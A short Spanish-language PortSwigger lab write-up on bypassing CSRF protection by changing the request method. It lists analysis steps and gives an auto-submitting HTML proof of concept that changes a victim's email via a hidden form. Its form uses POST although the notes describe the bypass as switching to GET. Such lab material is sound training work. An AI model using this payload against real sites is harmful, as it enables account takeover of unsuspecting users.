# Lab 2 CSRF where token validation depends on request method

Tags: #CSRF #PortSwigger

## Sección de análisis 

```bash 
1. Una acción relevante                              - Funcionalidad de cambio de email
2.  Manejo de una sesión basada en Cookie            - Sesion de Cookie 
3. Parámetro de petición imprevisible                - Metodo de peticion puede ser cambiado a GET ya que no solicita CSRF token

Testear CSRF Token:
1. Cambiar el metodo de POST a GET 
2. Ver si podemos eliminar el CSRF Token y mandar la peticion para cambiar el email 
3. Cuando quitamos el CSRF Token y hacemos la peticion por POST, este no nos deja hacer la solicitud
```

## CSRF PoC - HTML

```HTML 
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0ac7001d03cc4e768530088d007d0021.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="o&#64;o&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```